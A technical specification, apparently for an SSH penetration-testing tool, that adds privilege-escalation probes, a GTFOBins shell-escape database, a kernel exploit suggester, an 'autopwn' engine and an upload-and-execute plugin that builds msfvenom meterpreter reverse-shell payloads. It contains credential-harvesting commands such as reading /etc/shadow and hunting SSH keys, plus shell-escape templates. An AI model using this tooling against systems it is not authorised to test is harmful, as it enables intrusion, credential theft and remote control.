# Technical Specification: Plugin System Enhancements

## Technical Context

| Aspect | Detail |
|--------|--------|
| Language | Python 3.11+ |
| Build tool | Hatch |
| Linting | Ruff (100 char line length) |
| Type checking | mypy (strict) |
| Testing | pytest + pytest-timeout (30s per test), coverage required |
| Rich console | Dracula-themed Rich output with plain-text/JSON fallback |
| Plugin execution | subprocess.Popen with env injection via `PluginManager._prepare_plugin_env()` |
| Remote execution | SSH control sockets (`ssh -S <socket> -o ControlMaster=no`) |
| Key dependencies | Rich, prompt_toolkit (existing); no new runtime deps |

---

## Scope Summary

Two major deliverables:

1. **Enumeration plugin expansion** - Add ~50 new probes across 7 new categories, ~12 new heuristic evaluators, embedded GTFOBins database, kernel exploit suggester, autopwn exploitation engine, and output enhancements.

2. **Upload-and-Execute plugin** - New built-in Python plugin for uploading/executing binaries on remote hosts with optional msfvenom payload generation.

---

## Part 1: Enumeration Plugin Expansion

### 1.1 New Probes in `_enumeration_plan.py`

Extend `REMOTE_PROBES` tuple with new `RemoteProbe` entries. The existing pattern is followed exactly: each probe is a `RemoteProbe(category, key, command, timeout)` frozen dataclass.

**New categories and probes:**

#### Category: `capabilities` (new)
| Key | Command | Timeout |
|-----|---------|---------|
| `cap_binaries` | `getcap -r / 2>/dev/null` | 10 |
| `cap_interesting` | Filter output for dangerous caps (cap_setuid, cap_setgid, cap_dac_override, cap_sys_admin, cap_sys_ptrace, cap_net_raw, cap_chown, cap_fowner) | 10 |

Implementation note: `cap_interesting` will use a compound command that runs `getcap -r / 2>/dev/null` and pipes through `grep -iE` for the dangerous capabilities, avoiding a separate probe execution. This keeps it to a single remote command.

#### Category: `container` (new)
| Key | Command | Timeout |
|-----|---------|---------|
| `docker_group` | Check user groups for `docker` | 4 |
| `docker_socket` | Check `/var/run/docker.sock` accessibility | 4 |
| `container_detection` | Check `.dockerenv`, cgroups, lxc indicators | 6 |
| `lxc_check` | LXC/LXD container detection and escape potential | 4 |

#### Category: `credentials` (new)
| Key | Command | Timeout |
|-----|---------|---------|
| `shadow_readable` | `cat /etc/shadow 2>/dev/null \| head -5` | 4 |
| `ssh_keys` | Find readable private keys in common locations (~/.ssh, /root/.ssh, /home/*/.ssh) | 8 |
| `history_files` | Grep for passwords/tokens in bash/zsh/python history files | 8 |
| `config_credentials` | Search `.env`, `.htpasswd`, wp-config, database configs for credential patterns | 8 |
| `cloud_credentials` | Check AWS (~/.aws), GCP (~/.config/gcloud), Azure (~/.azure) credential files; check metadata endpoints | 8 |
| `git_credentials` | Check `.git-credentials`, `.gitconfig` for stored credentials | 4 |
| `database_configs` | Check `.my.cnf`, `.pgpass`, MongoDB configs | 4 |

#### Category: `writable` (new)
| Key | Command | Timeout |
|-----|---------|---------|
| `writable_passwd` | `test -w /etc/passwd && echo WRITABLE` | 3 |
| `writable_shadow` | `test -w /etc/shadow && echo WRITABLE` | 3 |
| `writable_sudoers` | Check writability of sudoers files | 4 |
| `writable_cron` | Check writability of system cron files and directories | 6 |
| `writable_services` | Find writable systemd service files | 8 |
| `writable_path_dirs` | Check if any PATH directories are writable by current user | 6 |
| `writable_profile` | Check writable shell profile files (`/etc/profile`, `/etc/bash.bashrc`, etc.) | 4 |
| `writable_init_scripts` | Check writable init.d scripts | 4 |

#### Category: `library_hijack` (new)
| Key | Command | Timeout |
|-----|---------|---------|
| `ld_preload` | Check LD_PRELOAD env and `/etc/ld.so.preload` | 4 |
| `ld_library_path` | Check LD_LIBRARY_PATH for hijacking opportunities | 4 |
| `python_path` | Check PYTHONPATH and writable Python lib directories | 6 |
| `rpath_runpath` | Check SUID binaries for writable RPATH/RUNPATH | 8 |

#### Category: `interesting_files` (new)
| Key | Command | Timeout |
|-----|---------|---------|
| `backup_files` | Check `/var/backups`, common backup locations | 6 |
| `mail_files` | Check `/var/mail`, `/var/spool/mail` | 4 |
| `opt_contents` | List `/opt` directory contents | 4 |
| `tmp_interesting` | Find scripts/executables in temp directories | 8 |
| `recently_modified` | Files modified in last 24h in sensitive locations | 8 |

#### Additions to existing categories:

**`filesystem` (expand):**
| Key | Command | Timeout |
|-----|---------|---------|
| `nfs_exports` | `cat /etc/exports 2>/dev/null` | 4 |
| `mounted_nfs` | List NFS mounts and options from `mount` output | 4 |

**`users` (expand):**
| Key | Command | Timeout |
|-----|---------|---------|
| `doas_conf` | `cat /etc/doas.conf 2>/dev/null` | 4 |
| `polkit_rules` | Check for polkit rules in `/etc/polkit-1/`, `/usr/share/polkit-1/` | 6 |
| `pkexec_version` | `pkexec --version 2>/dev/null` | 3 |

**Total new probes: ~40** (bringing total from 75 to ~115).

Update `SELECTED_CATEGORY_ORDER` in `enumerate.py` to include the new categories in a logical position:
```python
SELECTED_CATEGORY_ORDER = (
    "system",
    "users",
    "network",
    "filesystem",
    "capabilities",      # NEW
    "writable",          # NEW
    "credentials",       # NEW
    "container",         # NEW
    "library_hijack",    # NEW
    "interesting_files", # NEW
    "security",
    "scheduled",
    "processes",
    "packages",
    "environment",
    "logs",
    "hardware",
)
```

### 1.2 New Heuristic Evaluators

Add new `PriorityHeuristic` entries to `PRIORITY_HEURISTICS` in `_enumeration_plan.py` and corresponding evaluator functions in `enumerate.py`.

**New heuristics:**

| Key | Category | Severity | Evaluator Logic |
|-----|----------|----------|-----------------|
| `dangerous_capabilities` | capabilities | high | Flag binaries with cap_setuid, cap_sys_admin, etc. from `cap_binaries` probe |
| `writable_passwd` | writable | high | Flag if `writable_passwd` probe returns "WRITABLE" |
| `docker_escape` | container | high | Flag if user is in docker group OR docker socket is accessible |
| `writable_service_files` | writable | high | Flag writable systemd services run as root |
| `credential_exposure` | credentials | high | Flag readable SSH keys, readable shadow, found credential files |
| `gtfobins_sudo` | users | high | Cross-reference sudo-allowed binaries against GTFOBins database |
| `gtfobins_suid` | filesystem | high | Cross-reference SUID binaries against GTFOBins database |
| `writable_path` | writable | medium | Flag writable directories in PATH |
| `writable_cron_files` | writable | medium | Flag writable cron files/directories |
| `nfs_no_root_squash` | filesystem | medium | Flag NFS shares with no_root_squash in exports |
| `ld_preload_hijack` | library_hijack | medium | Flag LD_PRELOAD/library hijacking opportunities |
| `container_detected` | container | medium | Flag container environment detected |
| `cloud_environment` | credentials | info | Flag cloud credential files or metadata available |
| `interesting_backups` | interesting_files | info | Flag accessible backup files |
| `recent_modifications` | interesting_files | info | Flag recently modified sensitive files |

Each evaluator follows the existing pattern:
```python
def _evaluate_<heuristic_key>(
    snapshot: EnumerationSnapshot, meta: PriorityHeuristic
) -> PriorityFinding | None:
```

Register in `HEURISTIC_EVALUATORS` dict.

### 1.3 GTFOBins Database

**New file: `src/lazyssh/plugins/_gtfobins_data.py`**

This module embeds a curated subset of the GTFOBins database as a Python data structure. No network access required.

```python
@dataclass(frozen=True)
class GTFOBinsEntry:
    """A single GTFOBins exploitation technique."""
    binary: str
    capability: str  # "suid", "sudo", "capabilities", "file-read", "file-write", "shell"
    command_template: str  # Command with {binary} placeholder
    description: str

# Top ~100 exploitable binaries
GTFOBINS_DB: tuple[GTFOBinsEntry, ...] = (
    GTFOBinsEntry("vim", "sudo", "sudo {binary} -c ':!/bin/sh'", "Spawn shell via vim"),
    GTFOBinsEntry("vim", "suid", "{binary} -c ':py3 import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'", "SUID shell escape"),
    # ... ~300-400 entries covering top 100 binaries across capabilities
)
```

**Lookup functions:**
```python
def lookup_suid(binary_name: str) -> list[GTFOBinsEntry]: ...
def lookup_sudo(binary_name: str) -> list[GTFOBinsEntry]: ...
def lookup_capabilities(binary_name: str) -> list[GTFOBinsEntry]: ...
```

**Binary coverage target:** ~100 most common exploitable binaries including:
`awk`, `base64`, `bash`, `busybox`, `cat`, `chmod`, `chown`, `cp`, `crontab`, `curl`, `cut`, `dash`, `date`, `dd`, `diff`, `dmesg`, `docker`, `dpkg`, `ed`, `emacs`, `env`, `expand`, `expect`, `file`, `find`, `flock`, `fmt`, `fold`, `ftp`, `gawk`, `gcc`, `gdb`, `git`, `grep`, `head`, `ionice`, `ip`, `jq`, `ksh`, `ld.so`, `less`, `logsave`, `ltrace`, `lua`, `make`, `man`, `mawk`, `more`, `mount`, `mv`, `mysql`, `nano`, `nasm`, `nc`, `nice`, `nl`, `nmap`, `node`, `od`, `openssl`, `perl`, `pg`, `php`, `pic`, `pico`, `pip`, `pkexec`, `python`, `python3`, `readelf`, `rev`, `rlwrap`, `rsync`, `ruby`, `run-parts`, `rvim`, `scp`, `screen`, `sed`, `setarch`, `shuf`, `socat`, `sort`, `sqlite3`, `ssh`, `stdbuf`, `strace`, `strings`, `su`, `tail`, `tar`, `taskset`, `tee`, `telnet`, `tftp`, `time`, `timeout`, `tmux`, `top`, `ul`, `uniq`, `unshare`, `vi`, `vim`, `watch`, `wget`, `wish`, `xargs`, `xxd`, `zip`, `zsh`.

### 1.4 Kernel Exploit Suggester

**New file: `src/lazyssh/plugins/_kernel_exploits.py`**

```python
@dataclass(frozen=True)
class KernelExploit:
    """A kernel exploit mapped to vulnerable version ranges."""
    cve: str
    name: str
    min_version: tuple[int, ...]  # e.g., (2, 6, 22)
    max_version: tuple[int, ...]  # e.g., (5, 8, 0)
    description: str
    reference_url: str

KERNEL_EXPLOITS: tuple[KernelExploit, ...] = (
    KernelExploit(
        cve="CVE-2022-0847",
        name="DirtyPipe",
        min_version=(5, 8, 0),
        max_version=(5, 16, 11),
        description="Overwrite data in arbitrary read-only files",
        reference_url="https://dirtypipe.cm4all.com/",
    ),
    # DirtyCOW, PwnKit, overlayfs, Netfilter, etc.
)
```

**Lookup function:**
```python
def suggest_exploits(kernel_version: str) -> list[KernelExploit]:
    """Parse kernel version string and return matching exploits."""
```

Version parsing will handle common formats: `5.10.100-generic`, `4.15.0-213-generic`, etc. Extract the major.minor.patch tuple and compare against ranges.

**Coverage target:** ~15-20 major kernel exploits including:
- DirtyPipe (CVE-2022-0847)
- DirtyCOW (CVE-2016-5195)
- PwnKit (CVE-2021-4034) - pkexec, not kernel, but version-dependent
- Overlayfs (CVE-2021-3493)
- Netfilter (CVE-2022-25636)
- Baron Samedit (CVE-2021-3156) - sudo, but version-dependent
- Polkit (CVE-2021-3560)
- Sequoia (CVE-2021-33909)
- GameOver(lay) (CVE-2023-2640, CVE-2023-32629)
- Looney Tunables (CVE-2023-4911) - glibc, but included for completeness
- nf_tables (CVE-2023-32233)
- Dirty Cred (CVE-2022-2588)

### 1.5 Autopwn Engine

**New file: `src/lazyssh/plugins/_autopwn.py`**

The autopwn engine is an orchestration layer invoked when `--autopwn` is passed to the enumerate plugin. It takes the `EnumerationSnapshot` and `PriorityFinding` list as input, identifies exploitable findings, and executes exploitation sequences with user confirmation.

**Architecture:**

```python
@dataclass
class ExploitAttempt:
    """Record of a single exploitation attempt."""
    technique: str
    target: str
    dry_run: bool
    command: str
    success: bool
    output: str
    rollback_command: str | None

@dataclass
class AutopwnResult:
    """Complete autopwn session results."""
    attempts: list[ExploitAttempt]
    successes: int
    failures: int

class AutopwnEngine:
    """Orchestrates automated exploitation of discovered vulnerabilities."""

    def __init__(
        self,
        snapshot: EnumerationSnapshot,
        findings: list[PriorityFinding],
        dry_run: bool = False,
    ) -> None: ...

    def run(self) -> AutopwnResult:
        """Execute autopwn sequence. Returns results."""
        ...

    def _exploit_writable_passwd(self) -> ExploitAttempt | None: ...
    def _exploit_gtfobins_suid(self, binary: str, entry: GTFOBinsEntry) -> ExploitAttempt | None: ...
    def _exploit_gtfobins_sudo(self, binary: str, entry: GTFOBinsEntry) -> ExploitAttempt | None: ...
    def _exploit_docker_escape(self) -> ExploitAttempt | None: ...
    def _exploit_writable_cron(self, path: str) -> ExploitAttempt | None: ...
    def _exploit_writable_service(self, path: str) -> ExploitAttempt | None: ...
```

**Remote execution helper** reuses the same `execute_remote_batch()` pattern from enumerate.py. The autopwn engine composes shell commands and sends them through the SSH control socket.

**Safety features:**
- Every exploit requires user confirmation via Rich `Confirm.ask()` (skipped in dry-run)
- Dry-run mode (`--autopwn --dry-run`) shows commands without executing
- All attempts logged to `ExploitAttempt` records
- Rollback commands stored where applicable (e.g., restore original `/etc/passwd`)
- Clear Rich-formatted warnings before each exploit attempt

**Integration with enumerate.py `main()`:**
- Parse `--autopwn` and `--dry-run` flags from `sys.argv`
- After generating findings, if `--autopwn`, instantiate `AutopwnEngine` and call `run()`
- Render autopwn results after the regular enumeration output

### 1.6 Output Enhancements

Modify `render_rich()` and `render_plain()` in `enumerate.py`:

**New severity level for heuristics: `critical`**
Added to support the "Quick Wins" concept. The existing `Severity` type alias remains a string, just adding a new value. `SEVERITY_STYLES` updated:
```python
SEVERITY_STYLES = {
    "critical": "error",  # NEW - bright red, exploitable now
    "high": "error",
    "medium": "warning",
    "info": "info",
}
```

**Quick Wins summary** - New section at the top of output (both plain and Rich) that filters findings by exploitation difficulty:
- "Instant" - writable /etc/passwd, GTFOBins SUID with known technique
- "Easy" - GTFOBins sudo, docker escape
- "Moderate" - writable cron/services, library hijacking

**Exploit commands in findings** - When a GTFOBins match is found, the `evidence` list in `PriorityFinding` includes the ready-to-execute command template with the actual binary path substituted.

**Difficulty classification** - Add an `exploitation_difficulty` field to `PriorityFinding`:
```python
@dataclass
class PriorityFinding:
    key: str
    category: str
    severity: Severity
    headline: str
    detail: str
    evidence: list[str]
    exploitation_difficulty: str = ""  # "instant", "easy", "moderate", "" (unknown)
    exploit_commands: list[str] | None = None  # Ready-to-execute commands
```

This is a backward-compatible extension (default empty string / None).

---

## Part 2: Upload-and-Execute Plugin

### 2.1 File Structure

**New file: `src/lazyssh/plugins/upload_exec.py`**

Standalone Python plugin following the same pattern as `enumerate.py` - a single file with metadata headers, using environment variables for connection context.

```python
#!/usr/bin/env python3
# PLUGIN_NAME: upload-exec
# PLUGIN_DESCRIPTION: Upload and execute binaries on remote hosts with msfvenom support
# PLUGIN_VERSION: 1.0.0
# PLUGIN_REQUIREMENTS: python3
```

### 2.2 Architecture Detection

**Module: `_arch_detection.py`** (new helper in `src/lazyssh/plugins/`)

```python
@dataclass(frozen=True)
class RemoteArch:
    """Detected remote system architecture."""
    raw_arch: str     # e.g., "x86_64"
    raw_os: str       # e.g., "Linux"
    msf_arch: str     # e.g., "x64"
    msf_platform: str # e.g., "linux"

ARCH_MAP: dict[str, str] = {
    "x86_64": "x64",
    "amd64": "x64",
    "i686": "x86",
    "i386": "x86",
    "aarch64": "aarch64",
    "arm64": "aarch64",
    "armv7l": "armle",
    "armv6l": "armle",
    "mips": "mips",
    "mipsel": "mipsel",
    "ppc64le": "ppc64le",
}

def detect_remote_arch() -> RemoteArch:
    """Detect remote architecture via SSH control socket."""
    # Uses uname -m and uname -s over control socket
```

### 2.3 Core Upload and Execute Flow

```
upload_exec.py main()
    ├── Parse CLI arguments (argparse)
    ├── Detect remote architecture (_arch_detection.detect_remote_arch())
    │
    ├── [Interactive mode - no args]
    │   ├── Display remote info
    │   ├── Present menu (upload binary / generate msfvenom / upload only)
    │   └── Dispatch to selected mode
    │
    ├── [Upload & Execute mode]
    │   ├── Validate local file exists
    │   ├── Optional: Validate ELF header vs remote arch
    │   ├── Create remote staging dir (/tmp/.lazyssh_exec/, 0700)
    │   ├── SCP upload via control socket
    │   ├── chmod +x on remote
    │   ├── Execute (with optional --background nohup)
    │   ├── Stream output back (or save to --output-file)
    │   └── Cleanup remote files (unless --no-cleanup)
    │
    └── [Msfvenom mode - --msfvenom flag]
        ├── Check msfvenom availability (shutil.which)
        ├── Determine payload based on remote arch
        ├── Prompt/accept LHOST and LPORT
        ├── Generate payload via subprocess
        ├── Upload & Execute generated payload
        ├── Display msfconsole handler command
        └── Cleanup local temp payload
```

### 2.4 SCP Upload Implementation

Reuse the SSH control socket pattern already established in `scp_mode.py` and `enumerate.py`:

```python
def _scp_upload(local_path: str, remote_path: str) -> bool:
    """Upload file via SCP over control socket."""
    socket_path = os.environ["LAZYSSH_SOCKET_PATH"]
    host = os.environ["LAZYSSH_HOST"]
    user = os.environ["LAZYSSH_USER"]
    port = os.environ.get("LAZYSSH_PORT")

    cmd = ["scp", "-q", "-o", f"ControlPath={socket_path}"]
    if port:
        cmd.extend(["-P", port])
    cmd.extend([local_path, f"{user}@{host}:{remote_path}"])

    result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    return result.returncode == 0
```

### 2.5 Msfvenom Integration

```python
@dataclass
class MsfvenomConfig:
    """Configuration for msfvenom payload generation."""
    payload: str        # e.g., "linux/x64/meterpreter/reverse_tcp"
    lhost: str
    lport: int
    format: str         # "elf", "raw", "py", "sh"
    encoder: str | None
    iterations: int

PAYLOAD_PRESETS: dict[str, str] = {
    "x64": "linux/x64/meterpreter/reverse_tcp",
    "x86": "linux/x86/meterpreter/reverse_tcp",
    "aarch64": "linux/aarch64/meterpreter/reverse_tcp",
    "armle": "linux/armle/meterpreter/reverse_tcp",
}

def generate_msfvenom_payload(config: MsfvenomConfig, output_path: str) -> bool:
    """Generate payload using msfvenom. Returns success."""
    cmd = ["msfvenom", "-p", config.payload,
           f"LHOST={config.lhost}", f"LPORT={config.lport}",
           "-f", config.format, "-o", output_path]
    if config.encoder:
        cmd.extend(["-e", config.encoder, "-i", str(config.iterations)])
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    return result.returncode == 0

def get_handler_command(config: MsfvenomConfig) -> str:
    """Return msfconsole handler setup commands."""
    return (
        f"use exploit/multi/handler\n"
        f"set payload {config.payload}\n"
        f"set LHOST {config.lhost}\n"
        f"set LPORT {config.lport}\n"
        f"run"
    )
```

### 2.6 Interactive Mode

Uses Rich prompts (consistent with existing UI patterns):

```python
from rich.prompt import Prompt, IntPrompt, Confirm
```

Menu system:
1. **Upload and execute a local binary** - Prompt for file path (with path completion)
2. **Generate msfvenom payload and execute** - Walk through payload config
3. **Upload only (no execution)** - Upload file, skip execution

### 2.7 CLI Arguments

Parsed via `argparse` in `main()`:

```
upload-exec [OPTIONS] [FILE_PATH]

Positional:
  FILE_PATH                    Local file to upload and execute

Options:
  --args ARGS                  Arguments to pass to binary on remote
  --no-cleanup                 Don't delete file after execution
  --background                 Execute in background (nohup)
  --timeout SECONDS            Override execution timeout (default: 300)
  --output-file PATH           Save remote output to local file
  --msfvenom                   Generate msfvenom payload instead of uploading file
  --payload PAYLOAD            Override auto-selected msfvenom payload
  --lhost HOST                 LHOST for msfvenom (auto-detected if omitted)
  --lport PORT                 LPORT for msfvenom (default: 4444)
  --encoder ENCODER            Msfvenom encoder
  --iterations N               Encoder iterations (default: 1)
  --format FORMAT              Output format: elf, raw, py, sh (default: elf)
  --dry-run                    Show what would happen without executing
```

---

## Part 3: Plugin System Integration

### 3.1 Environment Variable Addition

Add `LAZYSSH_CONNECTION_DIR` to `_prepare_plugin_env()` in `plugin_manager.py`:

```python
# In _prepare_plugin_env():
env["LAZYSSH_CONNECTION_DIR"] = connection.connection_dir
```

This exposes the per-connection workspace directory (`/tmp/lazyssh/{name}.d/`) so plugins can use it for staging.

### 3.2 Command Mode Tab Completion

The existing tab completion in `command_mode.py` already dynamically discovers plugins via `discover_plugins()`. Adding new plugin files to `src/lazyssh/plugins/` automatically makes them appear in completion. No changes needed for basic completion.

### 3.3 Help Text Updates

Update `_plugin_run` help output in `command_mode.py` to mention the new plugin and the `--autopwn` flag for enumerate.

---

## Source Code Structure Changes

### New Files

| File | Purpose | Est. Lines |
|------|---------|------------|
| `src/lazyssh/plugins/_gtfobins_data.py` | Embedded GTFOBins database (~100 binaries, ~300-400 entries) | ~800 |
| `src/lazyssh/plugins/_kernel_exploits.py` | Kernel exploit version-range database and matcher | ~200 |
| `src/lazyssh/plugins/_autopwn.py` | Autopwn exploitation engine | ~400 |
| `src/lazyssh/plugins/_arch_detection.py` | Remote architecture detection and mapping | ~80 |
| `src/lazyssh/plugins/upload_exec.py` | Upload-and-Execute plugin (main entry point) | ~500 |
| `tests/test_gtfobins_data.py` | GTFOBins database correctness tests | ~150 |
| `tests/test_kernel_exploits.py` | Kernel exploit suggester tests | ~100 |
| `tests/test_autopwn.py` | Autopwn engine tests (mocked remote execution) | ~300 |
| `tests/test_upload_exec.py` | Upload-and-Execute plugin tests | ~350 |

### Modified Files

| File | Changes |
|------|---------|
| `src/lazyssh/plugins/_enumeration_plan.py` | Add ~40 new `RemoteProbe` entries, ~15 new `PriorityHeuristic` entries |
| `src/lazyssh/plugins/enumerate.py` | Add ~15 new evaluator functions, update `SELECTED_CATEGORY_ORDER`, extend `PriorityFinding` dataclass, add Quick Wins rendering, add `--autopwn`/`--dry-run` flag handling in `main()`, integrate GTFOBins cross-referencing in evaluators |
| `src/lazyssh/plugin_manager.py` | Add `LAZYSSH_CONNECTION_DIR` to `_prepare_plugin_env()` |
| `tests/test_enumerate_summary.py` | Add tests for new evaluators, new probes, extended `PriorityFinding` fields |
| `CHANGELOG.md` | Add entries under `[Unreleased]` |

### Unchanged Files

- `command_mode.py` - Tab completion auto-discovers plugins; no code changes needed
- `ssh.py` - No changes; plugins use SSH via environment variables
- `scp_mode.py` - No changes; upload-exec plugin implements its own SCP command
- `config.py` - No changes
- `models.py` - No changes

---

## Data Model Changes

### Extended `PriorityFinding` (backward-compatible)

```python
@dataclass
class PriorityFinding:
    key: str
    category: str
    severity: Severity
    headline: str
    detail: str
    evidence: list[str]
    # NEW fields with defaults for backward compatibility
    exploitation_difficulty: str = ""
    exploit_commands: list[str] = field(default_factory=list)
```

The `to_dict()` method will include the new fields. JSON output schema extends naturally.

### New Plugin Environment Variables

| Variable | Value | Source |
|----------|-------|--------|
| `LAZYSSH_CONNECTION_DIR` | `/tmp/lazyssh/{name}.d` | `SSHConnection.connection_dir` |

---

## Delivery Phases

### Phase 1: Enumeration Probe Expansion + Heuristics
- Add new probes to `_enumeration_plan.py`
- Add new evaluators to `enumerate.py`
- Update `SELECTED_CATEGORY_ORDER`
- Extend `PriorityFinding` dataclass
- Unit tests for new probes and evaluators

**Verification:** `make check && make test` pass. New probes appear in `build_remote_script()` output. New evaluators fire on synthetic test data.

### Phase 2: GTFOBins Database + Kernel Exploit Suggester
- Create `_gtfobins_data.py` with embedded database
- Create `_kernel_exploits.py` with exploit version ranges
- Wire GTFOBins lookups into `_evaluate_gtfobins_suid` and `_evaluate_gtfobins_sudo` evaluators
- Wire kernel exploit suggestions into a new evaluator `_evaluate_kernel_exploits`
- Unit tests for data integrity, lookup functions, and version parsing

**Verification:** `make check && make test` pass. GTFOBins cross-references produce correct exploit commands for known binaries. Kernel version matching returns expected CVEs.

### Phase 3: Autopwn Engine
- Create `_autopwn.py`
- Integrate into `enumerate.py` `main()` via `--autopwn` / `--dry-run` flags
- Implement exploitation methods for: writable passwd, GTFOBins SUID, GTFOBins sudo, docker escape, writable cron, writable services
- Unit tests with mocked remote execution

**Verification:** `make check && make test` pass. Dry-run mode produces expected exploit plans. Mocked execution tests verify command construction and rollback logic.

### Phase 4: Output Enhancements
- Add Quick Wins summary section to `render_rich()` and `render_plain()`
- Add difficulty classification to findings
- Add exploit command display in findings
- Update JSON output to include new fields

**Verification:** `make check && make test` pass. Rich output includes Quick Wins section. JSON output includes new fields.

### Phase 5: Upload-and-Execute Plugin
- Create `_arch_detection.py`
- Create `upload_exec.py` with full CLI, interactive mode, msfvenom integration
- Add `LAZYSSH_CONNECTION_DIR` env var to `plugin_manager.py`
- Unit tests for all components

**Verification:** `make check && make test` pass. Plugin appears in `plugin list`. Msfvenom command construction is correct. Architecture detection maps correctly.

### Phase 6: Final Integration + CHANGELOG
- End-to-end integration verification
- Update CHANGELOG.md
- Full `make verify` pass

**Verification:** `make verify` passes (check + test + build). All new plugins discoverable. Help text updated.

---

## Verification Approach

### Automated
- `make check` - Ruff linting + mypy type checking
- `make test` - pytest with coverage, 30s timeout per test
- `make build` - Package builds successfully
- `make verify` - All of the above

### Test Isolation

All tests must mock external dependencies per CLAUDE.md requirements:

**Enumeration tests** - Use synthetic `EnumerationSnapshot` objects with hand-crafted `ProbeOutput` data. No real SSH calls.

**GTFOBins tests** - Test data structure integrity (all entries have non-empty fields, valid capabilities), lookup function correctness with known binaries.

**Kernel exploit tests** - Test version parsing with various formats, version range matching, edge cases.

**Autopwn tests** - Mock `subprocess.run` for all remote execution. Verify command construction, confirm prompts (mock `Confirm.ask`), dry-run output, rollback command generation.

**Upload-exec tests** - Mock `subprocess.run` for SCP and SSH commands. Mock `shutil.which` for msfvenom detection. Test argument parsing, architecture detection mapping, msfvenom command construction, cleanup logic.

### Manual
- Verify plugin discovery: `plugin list` shows both `enumerate` and `upload-exec`
- Verify enumerate output formatting with new categories
- Verify `--json` output includes new fields
